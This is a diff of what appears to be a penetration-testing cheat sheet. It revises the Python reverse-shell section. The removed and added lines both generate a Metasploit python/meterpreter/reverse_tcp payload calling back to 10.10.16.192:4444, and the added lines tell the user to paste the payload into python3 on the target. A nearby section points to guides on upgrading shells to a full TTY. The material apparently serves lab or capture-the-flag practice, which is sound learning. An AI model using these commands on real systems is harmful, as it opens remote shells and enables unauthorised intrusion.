@@ -114,7 +114,9 @@ PHP
     target $ php shell.php    
 Python    
 
-    msfvenom -p python/meterpreter/reverse_tcp RHOST=10.10.16.192 LPORT=4444 -f raw > shell.py    
+    msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.16.192 LPORT=4444 -f raw     
+    target$ python3 
+    target$ [paste payload]   
 ## Upgrading to a pseudo terminal / TTY     
 [Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)  
 [What Happens in a Shell Upgrade?](What Happens In a "Shell Upgrade"?)   
